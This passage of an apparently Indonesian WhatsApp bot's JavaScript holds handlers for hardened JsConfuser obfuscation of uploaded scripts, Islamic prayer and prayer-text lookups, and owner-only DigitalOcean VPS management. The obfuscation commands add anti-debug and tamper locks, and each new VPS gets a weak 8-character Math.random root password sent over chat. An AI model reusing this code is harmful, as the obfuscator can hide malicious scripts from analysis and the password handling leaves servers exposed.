                const obf = await JsConfuser.obfuscate(raw, getSiuObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `siu-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Calcrick Chaos Core encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encstrong':
            case 'encryptstrong':
            case 'encrypt-strong':
            case 'strongenc':
            case 'strong-encrypt':
            case 'enc-strong': {
              if (!m.quoted) return m.reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const getStrongObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: 'randomized',
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.75,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  calculator: true,
                  dispatcher: true,
                  deadCode: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getStrongObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `strong-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Hardened Strong encrypted!* — SATURN 🔥'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encultra':
            case 'encryptultra':
            case 'encrypt-ultra':
            case 'ultraenc':
            case 'ultra-encrypt':
            case 'enc-ultra': {
              if (!m.quoted) return m.reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const genUltra = () => {
                  const chars = 'abcdefghijklmnopqrstuvwxyz'
                  const nums = '0123456789'
                  return 'z' + nums[Math.floor(Math.random() * nums.length)] + chars[Math.floor(Math.random() * chars.length)] + Math.random().toString(36).slice(2, 6)
                }

                const getUltraObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genUltra,
                  stringCompression: true,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.9,
                  flatten: true,
                  shuffle: true,
                  rgf: true,
                  deadCode: true,
                  opaquePredicates: true,
                  dispatcher: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getUltraObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `ultra-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Hardened Ultra encrypted!* — SATURN 🔥'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break
            
            // ISLAM MENU
                        case 'jadwal-sholat':
            case 'jadwalsholat':
            case 'sholat':
            case 'waktusholat': {
              try {
                if (!text) return m.reply(`Contoh penggunaan:\n${cmd} Surabaya`)

                const apiUrl = `https://api.vreyn.web.id/api/search/jadwalsholat?kota=${encodeURIComponent(text)}`
                const data = await fetchJson(apiUrl)

                if (!data.status || !data.result) {
                  return m.reply('Data jadwal sholat tidak ditemukan.')
                }

                const kota = data.city
                const tanggal = data.result.tanggal
                const {
                  imsak,
                  subuh,
                  terbit,
                  dhuha,
                  dzuhur,
                  ashar,
                  maghrib,
                  isya
                } = data.result

                const pesan = `
🕌 *JADWAL SHOLAT HARI INI*
📍 *Kota:* ${kota}
📅 *Tanggal:* ${tanggal}

- Imsak : ${imsak}
- Subuh : ${subuh}
- Terbit : ${terbit}
- Dhuha : ${dhuha}
- Dzuhur : ${dzuhur}
- Ashar : ${ashar}
- Maghrib : ${maghrib}
- Isya : ${isya}

📡 *Sumber:* Kemenag RI
🌐 *API:* api.vreyn.web.id
`.trim()

                m.reply(pesan)

              } catch (err) {
                console.error(err)
                m.reply('Terjadi kesalahan saat mengambil data jadwal sholat.')
              }
            }
            break

            case 'asmaulhusna': {
              try {
                let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/asmaulhusna')
                let ye = jir.data

                let tks = '*ASMAUL HUSNA*\n\n' + ye.map((item) => {
                  return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
                }).join('\n')

                m.reply(tks)
              } catch (err) {
                console.error(err)
                m.reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'niat-sholat':
            case 'niatsholat': {
              try {
                let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/niatshalat')
                let niatSholat = jir

                if (!text) {
                  let daftarNiat = '*DAFTAR NIAT SHOLAT*\n\n' + niatSholat.map((item) => `- ${item.name}`).join('\n')
                  daftarNiat += '\n\nKetik *.niatsholat [nama sholat]* untuk melihat niat, contoh: *.niatsholat subuh*'
                  m.reply(daftarNiat)
                } else {
                  let hasil = niatSholat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()))

                  if (hasil) {
                    let tks = `*${hasil.name.toUpperCase()}*\n\n` +
                      `Arab: ${hasil.arabic}\n` +
                      `Latin: ${hasil.latin}\n` +
                      `Terjemahan: ${hasil.terjemahan}`
                    m.reply(tks)
                  } else {
                    m.reply('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
                  }
                }
              } catch (err) {
                console.error(err)
                m.reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'surah': {
              try {
                if (!text) {
                  m.reply('Ketik nomor surahnya! Contoh: *.surah 1* buat ambil ayat-ayat dari Al-Fatihah')
                  return
                }

                let response = await fetchJson(`https://api.siputzx.my.id/api/s/surah?no=${text}`)
                let data = response.data

                if (data.length > 0) {
                  let surahText = data.map((ayat, index) =>
                    `Ayat ${index + 1}:\n` +
                    `Arab: ${ayat.arab}\n` +
                    `Latin: ${ayat.latin}\n` +
                    `Terjemahan: ${ayat.indo}\n`
                  ).join('\n\n')

                  m.reply(surahText)
                } else {
                  m.reply('Gak ketemu, cek lagi nomor surahnya!')
                }
              } catch (err) {
                console.error(err)
                m.reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'doa':
            case 'berdoa': {
              try {
                let jir = await fetchJson('https://doa-doa-api-ahmadramadhan.fly.dev/api')
                let daftarDoa = jir

                if (!text) {
                  let listDoa = '*DAFTAR DOA*\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
                  listDoa += '\n\nKetik *.doa [nama doa]* untuk melihat doa, contoh: *.doa doa sebelum tidur*'
                  m.reply(listDoa)
                } else {
                  let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))

                  if (hasil) {
                    let tks = `*${hasil.doa.toUpperCase()}*\n\n` +
                      `Ayat: ${hasil.ayat}\n` +
                      `Latin: ${hasil.latin}\n` +
                      `Artinya: ${hasil.artinya}`
                    m.reply(tks)
                  } else {
                    m.reply('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
                  }
                }
              } catch (err) {
                console.error(err)
                m.reply('Error cuy, coba lagi ntar!')
              }
            }
            break

            case 'gislam': {
              if (!text) return m.reply('Mau cari tentang apa?')
              async function islam(query) {
                try {
                  const response = await fetchJson(`https://artikel-islam.netlify.app/.netlify/functions/api/ms?page=1&s=${Enc(query)}`)
                  if (response.success) {
                    const articles = response.data.data
                    let message = `Total artikel: ${articles.length}\n\n`
                    articles.forEach((article, index) => {
                      message += `${index + 1}. Judul: ${article.title}\nURL: ${article.url}\n\n`
                    })
                    return message
                  } else {
                    return 'Gagal mengambil data'
                  }
                } catch (error) {
                  return 'Terjadi kesalahan saat mengambil data'
                }
              }
              let lp = await islam(text)
              m.reply(lp)
            }
            break

            case 'kataislam': {
              async function AI(content) {
                try {
                  const response = await axios.post('https://ai.siputzx.my.id/', {
                    content,
                    cName: "S-AI",
                    cID: "S-AIbAQ0HcC"
                  });

                  return response.data
                } catch (error) {
                  console.error(error)
                  throw error
                }
              }
              let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
              let qo = await AI(qe)
              m.reply(qo.result)
            }
            break

            case 'pantunislam': {
              async function AI(content) {
                try {
                  const response = await axios.post('https://ai.siputzx.my.id/', {
                    content,
                    cName: "S-AI",
                    cID: "S-AIbAQ0HcC"
                  });

                  return response.data
                } catch (error) {
                  console.error(error)
                  throw error
                }
              }
              let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
              let qo = await AI(qe)
              m.reply(qo.result)
            }
            break
            
             // === Digital Ocean
            case 'cvps1g1c':
            case 'vps1g1c': {
              if (!isOwner) return m.reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-1vcpu-1gb', // 1GB RAM, 1 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps2g1c':
            case 'vps2g1c': {
              if (!isOwner) return m.reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-1vcpu-2gb', // 2GB RAM, 1 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps4g2c':
            case 'vps4g2c': {
              if (!isOwner) return m.reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-2vcpu-4gb', // 4GB RAM, 2 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps8g4c':
            case 'vps8g4c': {
              if (!isOwner) return m.reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-4vcpu-8gb', // 8GB RAM, 4 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'cvps16g4c':
            case 'vps16g4c': {
              if (!isOwner) return m.reply(mess.owner)

              let hostname = args[0];
              if (!hostname) return reply('Masukkan hostname VPS nya!');

              try {
                let dropletData = {
                  name: hostname,
                  region: 'sgp1',
                  size: 's-4vcpu-16gb', // 16GB RAM, 4 CPU
                  image: 'ubuntu-20-04-x64',
                  ssh_keys: null,
                  backups: false,
                  ipv6: true,
                  user_data: null,
                  private_networking: null,
                  volumes: null,
                  tags: ['T']
                };

                function generatePassword() {
                  const length = 8;
                  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                  let password = "";
                  for (let i = 0; i < length; i++) {
                    const randomIndex = Math.floor(Math.random() * charset.length);
                    password += charset[randomIndex];
                  }
                  return password;
                }

                let password = generatePassword();
                dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

                let response = await fetch('https://api.digitalocean.com/v2/droplets', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + doToken
                  },
                  body: JSON.stringify(dropletData)
                });

                let responseData = await response.json();

                if (response.ok) {
                  let dropletConfig = responseData.droplet;
                  let dropletId = dropletConfig.id;

                  reply(`Tunggu Sebentar...`);
                  await new Promise(resolve => setTimeout(resolve, 60000));

                  let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': "Bearer " + doToken
                    }
                  });

                  let dropletInfo = await dropletResponse.json();
                  let ipVPS = dropletInfo.droplet.networks.v4 && dropletInfo.droplet.networks.v4.length > 0 ?
                    dropletInfo.droplet.networks.v4[0].ip_address :
                    "Tidak ada alamat IP yang tersedia!";

                  let messageText = `VPS berhasil dibuat!\n\n`;
                  messageText += `ID: ${dropletId}\n`;
                  messageText += `IP VPS: ${ipVPS}\n`;
                  messageText += `Password: ${password}\n`;

                  await sock.sendMessage(m.chat, {
                    text: messageText
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
              } catch (err) {
                console.error(err);
                reply(`Terjadi kesalahan saat membuat VPS: ${err.message || err}`);
              }
            }
            break

            case 'listdroplet': {
              if (!isOwner) return m.reply(mess.owner)

              try {
                const getDroplets = async () => {
                  try {
                    const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                      headers: {
                        Authorization: `Bearer ${doToken}`
                      }
                    });
                    const data = await response.json();
                    return data.droplets || [];
                  } catch (err) {
                    reply('Error fetching droplets: ' + err);
                    return [];
                  }
                };

                getDroplets().then(droplets => {
                  let totalvps = droplets.length;
                  let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

                  if (droplets.length === 0) {
                    mesej += 'Tidak ada droplet yang tersedia!';
                  } else {
                    droplets.forEach(droplet => {
                      const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                      const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                      mesej += `Droplet ID: ${droplet.id}\n`;
                      mesej += `Hostname: ${droplet.name}\n`;
                      mesej += `Username: Root\n`;
                      mesej += `IP: ${ipAddress}\n`;
                      mesej += `Ram: ${droplet.memory} MB\n`;
                      mesej += `Cpu: ${droplet.vcpus} CPU\n`;
                      mesej += `OS: ${droplet.image.distribution}\n`;
                      mesej += `Storage: ${droplet.disk} GB\n`;
                      mesej += `Status: ${droplet.status}\n\n`;
                    });
                  }

                  sock.sendMessage(m.chat, {
                    text: mesej
                  }, {
                    quoted: fakeQuoted
                  });
                });
              } catch (err) {
                reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
              }
            }
            break

            case 'deldroplet': {
              if (!isOwner) return m.reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const deleteDroplet = async () => {
                try {
                  let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'DELETE',
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': `Bearer ${doToken}`
                    }
                  });

                  if (response.ok) {
                    reply('Droplet berhasil dihapus!');
                  } else {
                    const errorData = await response.json();
                    return new Error(`Gagal menghapus droplet: ${errorData.message}`);
                  }
                } catch (error) {
                  console.error('Terjadi kesalahan saat menghapus droplet:', error);
                  reply('Terjadi kesalahan saat menghapus droplet.');
                }
              };

              deleteDroplet();
            }
            break

            case 'sisadroplet': {
              if (!isOwner) return m.reply(mess.owner)

              async function getDropletInfo() {
                try {
                  const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
                    headers: {
                      Authorization: `Bearer ${doToken}`,
                    },
                  });

                  const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                      Authorization: `Bearer ${doToken}`,
                    },
                  });

                  if (accountResponse.status === 200 && dropletsResponse.status === 200) {
                    const dropletLimit = accountResponse.data.account.droplet_limit;
                    const dropletsCount = dropletsResponse.data.droplets.length;
                    const remainingDroplets = dropletLimit - dropletsCount;

                    return {
                      dropletLimit,
                      remainingDroplets,
                      totalDroplets: dropletsCount,
                    };
                  } else {
                    throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet!');
                  }
                } catch (err) {
                  throw new Error(err.message);
                }
              }

              async function sisadropletHandler() {
                try {
                  const dropletInfo = await getDropletInfo();
                  reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}\n\nTotal droplet terpakai: ${dropletInfo.totalDroplets}`);
                } catch (err) {
                  reply(`Terjadi kesalahan: ${err.message}`);
                }
              }

              sisadropletHandler();
            }
            break

            case 'cekdroplet': {
              if (!isOwner) return m.reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const getDropletInfo = async (dropletId) => {
                try {
                  const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
                  const response = await fetch(apiUrl, {
                    headers: {
                      'Content-Type': 'application/json',
                      'Authorization': `Bearer ${doToken}`
                    }
                  });

                  if (response.ok) {
                    const data = await response.json();
                    const droplet = data.droplet;
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    const vpsRam = droplet.memory / 1024;

                    return {
                      dropletid: droplet.id,
                      username: droplet.name,
                      ip: ipAddress,
                      ram: `${vpsRam} GB`,
                      os: droplet.image.distribution,
                      cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
                      storage: droplet.disk,
                      status: droplet.status
                    };
                  } else {
                    const errorData = await response.json();
                    return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
                  return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
                }
              };

              getDropletInfo(dropletId)
              .then((info) => {
                let textku = `*DETAIL VPS KAMU*\n`;
                textku += `Droplet ID: ${info.dropletid}\n`;
                textku += `Hostname: ${info.username}\n`;
                textku += `IPv4: ${info.ip}\n`;
                textku += `Ram: ${info.ram}\n`;
                textku += `OS: ${info.os}\n`;
                textku += `CPU: ${info.cpu}\n`;
                textku += `Storage: ${info.storage}\n`;
                textku += `Status: ${info.status}`;

                sock.sendMessage(m.chat, {
                  text: textku
                }, {
                  quoted: fakeQuoted
                });
              })
              .catch((err) => {
                reply(err);
                sock.sendMessage(m.chat, {
                  text: 'Terjadi kesalahan saat memeriksa detail VPS.'
                });
              });
            }
            break

            case 'turnon': {
              if (!isOwner) return m.reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              async function turnOnDroplet() {
                try {
                  const response = await axios.post(
                    `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                      type: 'power_on',
                    }, {
                      headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${doToken}`,
                      },
                    }
                  );

                  if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                    reply('VPS (droplet) sedang dihidupkan...');
                  } else {
                    reply('Gagal menghidupkan VPS (droplet).');
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat menghidupkan VPS (droplet):', err.message);
                }
              }

              turnOnDroplet();
            }
            break

            case 'turnoff': {
              if (!isOwner) return m.reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              async function turnOffDroplet() {
                try {
                  const response = await axios.post(
                    `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                      type: 'power_off',
                    }, {
                      headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${doToken}`,
                      },
                    }
                  );

                  if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                    reply('VPS (droplet) sedang dimatikan...');
                  } else {
                    reply('Gagal mematikan VPS (droplet).');
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat mematikan VPS (droplet):', err.message);
                }
              }

              turnOffDroplet();
            }
            break

            case 'restartvps': {
              if (!isOwner) return m.reply(mess.owner)
              let dropletId = args[0];
              if (!dropletId) return reply('ID droplet belum diberikan!');

              const restartVPS = async (dropletId) => {
                try {
                  const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;
                  const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                      'Content-Type': 'application/json',
                      Authorization: `Bearer ${doToken}`,
                    },
                    body: JSON.stringify({
                      type: 'reboot',
                    }),
                  });

                  if (response.ok) {
                    const data = await response.json();
                    return data.action;
                  } else {
                    const errorData = await response.json();
                    reply(`Gagal melakukan restart VPS: ${errorData.message}`);
                  }
                } catch (err) {
                  reply('Terjadi kesalahan saat melakukan restart VPS:', err.message);
                }
              };

              restartVPS(dropletId)
